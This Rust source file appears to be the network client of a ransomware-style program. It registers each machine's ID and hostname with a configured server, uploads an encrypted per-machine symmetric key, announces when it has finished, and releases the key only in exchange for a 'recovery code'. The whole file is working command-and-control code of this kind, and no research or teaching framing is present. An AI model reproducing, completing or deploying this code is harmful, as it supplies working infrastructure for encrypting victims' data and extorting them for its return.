use std::{path::Path, str};

use anyhow::{Context, anyhow};
use coconut_crab_lib::{
    file::write_to_file,
    web::{
        client::{web_get_recv_bytes, web_post_send_json_recv_text},
        responses::ServerResponse,
        routes,
        structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
        types::RecoveryCode,
        validate::{create_proof, decode_hex, validate_code},
    },
};
use hex::decode;
use purecrypto::{rsa::BoxedRsaPublicKey, zeroize::Zeroizing};
use serde::Serialize;
use tracing::{debug, info};

use crate::{config, crypto::decrypt_string, status::Status};

#[derive(Clone, Debug)]
pub(crate) struct ServerConn {
    pub fqdn: String,
    pub port: u16,
    pub https: bool,
    pub verify_server: bool,
}

impl ServerConn {
    pub(crate) fn new(
        fqdn: impl Into<String>,
        port: u16,
        https: bool,
        verify_server: bool,
    ) -> Self {
        Self {
            fqdn: fqdn.into(),
            port,
            https,
            verify_server,
        }
    }

    pub(crate) fn from_config() -> Self {
        Self::new(
            config::SERVER_FQDN.as_str(),
            config::SERVER_PORT,
            config::HTTPS,
            config::VERIFY_SERVER,
        )
    }

    fn base_url(&self, endpoint: &str) -> String {
        let scheme = if self.https { "https" } else { "http" };
        format!("{scheme}://{}:{}{endpoint}", self.fqdn, self.port)
    }
}

fn post_json<T: Serialize>(
    url: &str,
    payload: &T,
    verify_server: bool,
    label: &str,
) -> anyhow::Result<()> {
    let content = web_post_send_json_recv_text(url, payload, verify_server)
        .with_context(|| format!("{label} request failed"))?;
    debug!(content, "Response content text");
    match ServerResponse::parse(&content) {
        Some(ServerResponse::Success) => Ok(()),
        None => Err(anyhow!("unexpected {label} response: {content}")),
    }
}

pub(crate) fn write_asym_pub_key_to_disk(
    asym_pub_key: &BoxedRsaPublicKey,
    file_path: &Path,
) -> anyhow::Result<()> {
    let pem_data = asym_pub_key.to_spki_pem();
    write_to_file(pem_data.as_bytes(), file_path)?;
    info!(path = %file_path.display(), "Successfully wrote PEM data to file");
    Ok(())
}

pub(crate) fn download_asym_pub_key(conn: &ServerConn) -> anyhow::Result<BoxedRsaPublicKey> {
    let url = conn.base_url(routes::ASYM_PUB_KEY_PATH.as_str());
    debug!(url, "Asymmetric public key download URL");
    let content = web_get_recv_bytes(&url, conn.verify_server)?;
    let pem = str::from_utf8(&content).context("server response is not valid UTF-8")?;
    BoxedRsaPublicKey::from_spki_pem(pem).context("failed to parse PEM public key")
}

pub(crate) fn register(conn: &ServerConn, status: &Status, secret: &str) -> anyhow::Result<()> {
    let url = conn.base_url(routes::REGISTER.as_str());
    let proof_source = [status.id.as_bytes(), status.hostname.as_bytes()].concat();
    let registration = Registration {
        id: status.id.clone(),
        hostname: status.hostname.clone(),
        proof: create_proof(&proof_source, secret),
    };
    post_json(&url, &registration, conn.verify_server, "registration")
}

pub(crate) fn upload_sym_key(
    conn: &ServerConn,
    status: &Status,
    secret: &str,
) -> anyhow::Result<()> {
    let url = conn.base_url(routes::UPLOAD_SYM_KEY.as_str());
    let proof_source = [
        status.id.as_bytes(),
        status.asymmetrically_encrypted_symmetric_key.as_bytes(),
    ]
    .concat();
    let upload_sym_key = UploadSymKey {
        id: status.id.clone(),
        key: status.asymmetrically_encrypted_symmetric_key.clone(),
        proof: create_proof(&proof_source, secret),
    };
    post_json(&url, &upload_sym_key, conn.verify_server, "upload")?;
    info!("Successfully uploaded symmetric key");
    Ok(())
}

pub(crate) fn announce_completion(
    conn: &ServerConn,
    status: &Status,
    secret: &str,
) -> anyhow::Result<()> {
    let url = conn.base_url(routes::ANNOUNCE_COMPLETION.as_str());
    let proof_source = status.id.as_bytes().to_vec();
    let announce_completion = AnnounceCompletion {
        id: status.id.clone(),
        proof: create_proof(&proof_source, secret),
    };
    post_json(&url, &announce_completion, conn.verify_server, "completion")?;
    info!("Successfully announced completion");
    Ok(())
}

fn download_sym_key(
    conn: &ServerConn,
    status: &Status,
    code: &str,
    secret: &str,
) -> anyhow::Result<Zeroizing<[u8; 32]>> {
    if !validate_code(code) {
        return Err(anyhow!("invalid recovery code"));
    }
    let url = conn.base_url(routes::DOWNLOAD_SYM_KEY.as_str());
    let proof_source = [status.id.as_bytes(), code.as_bytes()].concat();
    let download_sym_key = DownloadSymKey {
        id: status.id.clone(),
        code: RecoveryCode::new(code.to_string()),
        proof: create_proof(&proof_source, secret),
    };
    let content = web_post_send_json_recv_text(&url, &download_sym_key, conn.verify_server)
        .context("symmetric key request failed")?;
    let content = Zeroizing::new(content);
    let Some(sym_key) = decode_hex::<32>(&content) else {
        return Err(anyhow!("server response is not a symmetric key"));
    };
    Ok(Zeroizing::new(sym_key))
}

#[tracing::instrument(skip_all)]
pub(crate) fn fetch_sym_key(
    conn: &ServerConn,
    status: &Status,
    code: &str,
    preshared_secret: &str,
) -> anyhow::Result<Zeroizing<[u8; 32]>> {
    let key = download_sym_key(conn, status, code, preshared_secret)?;
    let id_ciphertext =
        decode(&status.symmetrically_encrypted_id).context("unable to decode hex encrypted id")?;
    let id_nonce: [u8; 12] = decode_hex(&status.symmetrically_encrypted_id_nonce)
        .context("unable to decode hex nonce")?;
    let id_tag: [u8; 16] =
        decode_hex(&status.symmetrically_encrypted_id_tag).context("unable to decode hex tag")?;
    let decrypt_id_attempt = decrypt_string(
        &id_ciphertext,
        &key,
        &id_nonce,
        &id_tag,
        status.encryption_aad.as_bytes(),
    );
    if decrypt_id_attempt.as_deref() == Some(status.id.as_str()) {
        info!("Received correct symmetric key from server");
        Ok(key)
    } else {
        Err(anyhow!("received incorrect symmetric key from server"))
    }
}
